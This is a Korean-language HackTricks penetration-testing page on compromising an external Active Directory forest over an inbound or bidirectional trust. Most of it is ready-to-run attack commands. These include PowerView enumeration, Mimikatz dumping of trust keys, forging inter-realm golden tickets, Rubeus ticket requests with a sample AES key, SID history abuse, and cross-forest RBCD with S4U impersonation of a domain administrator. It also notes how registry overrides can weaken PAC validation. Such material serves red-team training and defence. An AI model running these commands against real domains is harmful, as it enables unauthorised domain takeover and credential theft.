# 외부 Forest Domain - OneWay (Inbound) 또는 bidirectional

{{#include ../../banners/hacktricks-training.md}}

이 시나리오에서는 외부 domain이 사용자(또는 양쪽 모두)를 trust하고 있으므로, 해당 domain에 대해 일종의 access를 얻을 수 있습니다.

## Enumeration

먼저 **trust**를 **enumerate**해야 합니다:
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.

# Additional trust hygiene checks (AD RSAT / AD module)
Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
```
> `SelectiveAuthentication`/`SIDFiltering*`을 사용하면 추가 prerequisite 없이 cross-forest abuse path(RBCD, SIDHistory)가 작동할 가능성이 있는지 빠르게 확인할 수 있습니다.<sup>[[2]](#references)</sup>

이전 enumeration에서 **`crossuser`** 사용자가 **외부 도메인의 DC** 내부에서 **Admin access**를 가진 **`External Admins`** 그룹에 속해 있음이 확인되었습니다.

## Initial Access

다른 도메인에서 사용자의 **special** access를 찾지 못했더라도, AD Methodology로 돌아가 **unprivileged user**에서 **privesc**를 시도할 수 있습니다(예: kerberoasting).

다음과 같이 `-Domain` param을 사용하여 **Powerview functions**로 **other domain**을 **enumerate**할 수 있습니다:
```bash
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{{#ref}}
./
{{#endref}}

## 사칭

### 로그인

외부 도메인에 액세스 권한이 있는 사용자의 자격 증명을 사용하여 일반적인 방법으로 로그인하면 액세스할 수 있어야 합니다:
```bash
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### SID History Abuse

forest trust를 통해 [**SID History**](sid-history-injection.md)를 악용할 수도 있습니다.

사용자가 **한 forest에서 다른 forest로** 마이그레이션되고 **SID Filtering이 활성화되어 있지 않으면**, **다른 forest의 SID를 추가**할 수 있으며, 이 **SID**는 **trust를 통해 인증할 때** **사용자의 token에 추가**됩니다.

> [!WARNING]
> 참고로 다음 명령을 사용하여 signing key를 가져올 수 있습니다.
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

**trusted** key로 서명하여 현재 domain 사용자를 **impersonating하는** **TGT**를 만들 수 있습니다.
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.domain.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### 사용자를 완전히 사칭하는 방법
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.domain.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### 신뢰하는 forest에서 컴퓨터 계정을 제어할 때의 Cross-forest RBCD (SID filtering / selective auth 없음)

foreign principal (FSP)이 신뢰하는 forest에서 컴퓨터 객체를 쓸 수 있는 그룹(예: `Account Operators`, custom provisioning group)에 사용자를 포함시키면, 해당 forest의 target host에서 **Resource-Based Constrained Delegation**을 구성하고 그곳의 모든 사용자를 impersonate할 수 있습니다:
```bash
# 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
# 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
Set-ADComputer -Identity victim-host$ -PrincipalsAllowedToDelegateToAccount MYLAB$
# or with PowerView
Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sidbytes_of_MYLAB}

# 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
```
이 방법은 **SelectiveAuthentication이 비활성화**되어 있고 **SID filtering**이 사용자의 제어 SID를 제거하지 않을 때만 작동합니다. SIDHistory forging을 피할 수 있는 빠른 lateral 경로이며, trust 검토에서 자주 누락됩니다.<sup>[[2]](#references)</sup>

### PAC validation hardening

**CVE-2024-26248**/**CVE-2024-29056**에 대한 PAC signature validation 업데이트는 inter-forest ticket에 signing enforcement를 추가합니다. **Compatibility mode**에서는 변조된 inter-realm PAC/SIDHistory/S4U 경로가 패치되지 않은 DC에서 여전히 작동할 수 있습니다. **Enforcement mode**에서는 forest trust를 통과하는 unsigned 또는 변조된 PAC 데이터가 거부됩니다. 단, 대상 forest trust key도 보유하고 있다면 예외입니다. Registry overrides(`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`)가 사용 가능한 동안에는 이를 통해 enforcement를 약화시킬 수 있습니다.<sup>[[1]](#references)</sup>

## References

- [1] [Microsoft KB5037754 – CVE-2024-26248 및 CVE-2024-29056에 대한 PAC validation 변경 사항](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
- [2] [MS-PAC 사양 – SID filtering 및 claims transformation 세부 정보](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
{{#include ../../banners/hacktricks-training.md}}
